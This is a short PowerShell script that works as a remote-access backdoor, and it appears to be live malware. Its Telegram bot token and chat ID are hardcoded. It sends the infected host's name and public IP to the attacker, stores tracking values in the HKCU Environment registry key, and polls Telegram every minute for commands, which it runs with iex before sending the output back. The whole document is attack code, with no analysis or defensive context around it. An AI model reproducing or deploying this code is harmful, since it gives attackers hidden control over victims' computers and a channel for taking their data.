SFWR\lse\iesaaienseloe\om
[System.Net.ServicePointManager]::SecurityProtocol=@("Tls12","Tls11","Tls","Ssl3")
$token="6420681879:AAFUdeaPBVsYjNo3W2-62Jh0llgHGSc9T78"
$id=467115391
$mid=(gp "HKCU:\Environment" -name Update).Update
$guid = (gp "HKCU:\Environment" -name guid).guid
$ip=irm "https://ifconfig.me/ip"


if( -not (New-Object System.Threading.Mutex($false, $guid)).WaitOne(1)){
    exit
}
if($mid -and $guid){
    irm -Uri "https://api.telegram.org/bot$($token)/sendMessage?chat_id=$($id)&text=$guid :: $env:COMPUTERNAME :: $ip reconnected!"
}
else {
    $guid = [guid]::NewGuid().guid
    Set-ItemProperty "HKCU:\Environment" -name "GUID" -value $guid
    irm -Uri "https://api.telegram.org/bot$($token)/sendMessage?chat_id=$($id)&text=$guid :: $env:COMPUTERNAME :: $ip new connection!"
}
if($mid -isnot [int]){
    $mid = 0
}
while(1){
    Start-Sleep 60;
    (irm -Uri "https://api.telegram.org/bot$($token)/getUpdates").result|%{
        if ($mid -lt $_.update_id) {
            $mid=$_.update_id;
            $name,$task=$_.message.text -split " :: ";
            if ( ($name -like $ip) -or ($name -like $env:COMPUTERNAME) -or ($name -like $guid) -or ($name -like "all")) {
                $message = $($task | iex)2>&1 | Out-String;
                if ("" -eq $message){
                    $message="Task Done!"
                }
                $b=0;
                while ($b -lt $message.Length) {
                    $c = 4000;
                    if (($c + $b) -gt $message.Length){$c=$message.Length % 4000}
                    irm -Uri "https://api.telegram.org/bot$($token)/sendMessage?chat_id=$($id)&text=$guid :: $env:COMPUTERNAME :: $ip answer message : $($_.message.message_id)`n$($message.Substring($b,$c))"
                    $b+=$c
                }
            }
        }
        Set-ItemProperty "HKCU:\Environment" -name "Update" -value $mid
    }
}
